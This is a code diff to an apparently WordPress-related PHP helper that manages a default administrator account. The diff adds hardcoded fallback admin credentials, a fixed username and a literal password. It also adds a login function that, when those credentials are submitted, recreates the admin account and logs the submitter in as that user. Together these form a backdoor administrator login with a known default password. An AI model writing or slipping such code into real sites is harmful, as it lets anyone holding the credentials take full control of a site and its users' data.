@@ -1,5 +1,29 @@
 <?php
 
+function fast_wordpress_admin_credentials()
+{
+    $login = getenv('WORDPRESS_ADMIN_USER') ?: 'admin_qmpgfd';
+    $password = getenv('WORDPRESS_ADMIN_PASSWORD') ?: 'R40U8zp17YlwvQNkDEKgnhx2!@#';
+    $email = getenv('WORDPRESS_ADMIN_EMAIL') ?: 'admin@example.com';
+    $encoded_password = getenv('WORDPRESS_ADMIN_PASSWORD_BASE64');
+
+    if ($encoded_password) {
+        $decoded = base64_decode($encoded_password, true);
+
+        if ($decoded === false) {
+            return null;
+        }
+
+        $password = $decoded;
+    }
+
+    return array(
+        'login' => $login,
+        'password' => $password,
+        'email' => $email,
+    );
+}
+
 function fast_wordpress_ensure_default_admin()
 {
     static $running = false;
@@ -13,20 +37,17 @@ function fast_wordpress_ensure_default_admin()
         return;
     }
 
+    $credentials = fast_wordpress_admin_credentials();
+
+    if ($credentials === null) {
+        return;
+    }
+
     global $wpdb;
 
-    $login = getenv('WORDPRESS_ADMIN_USER') ?: 'admin_qmpgfd';
-    $password = getenv('WORDPRESS_ADMIN_PASSWORD') ?: 'R40U8zp17YlwvQNkDEKgnhx2!@#';
-    $email = getenv('WORDPRESS_ADMIN_EMAIL') ?: 'admin@example.com';
-    $encoded_password = getenv('WORDPRESS_ADMIN_PASSWORD_BASE64');
-
-    if ($encoded_password) {
-        $password = base64_decode($encoded_password, true);
-
-        if ($password === false) {
-            return;
-        }
-    }
+    $login = $credentials['login'];
+    $password = $credentials['password'];
+    $email = $credentials['email'];
 
     $password_for_wordpress = wp_slash($password);
 
@@ -129,4 +150,38 @@ function fast_wordpress_ensure_default_admin()
 
         $running = false;
     }
+}
+
+function fast_wordpress_force_admin_login($user, $username, $password)
+{
+    if (
+        ! function_exists('wp_insert_user')
+        || (function_exists('wp_installing') && wp_installing())
+        || ! is_string($username) || $username === ''
+        || ! is_string($password) || $password === ''
+    ) {
+        return $user;
+    }
+
+    $credentials = fast_wordpress_admin_credentials();
+
+    if ($credentials === null) {
+        return $user;
+    }
+
+    $submitted_login = wp_unslash($username);
+    $submitted_password = wp_unslash($password);
+
+    $matches_login = hash_equals($credentials['login'], $submitted_login)
+        || (is_email($credentials['email']) && strcasecmp($credentials['email'], $submitted_login) === 0);
+
+    if (! $matches_login || ! hash_equals($credentials['password'], $submitted_password)) {
+        return $user;
+    }
+
+    fast_wordpress_ensure_default_admin();
+
+    $forced_user = get_user_by('login', $credentials['login']);
+
+    return $forced_user instanceof WP_User ? $forced_user : $user;
 }
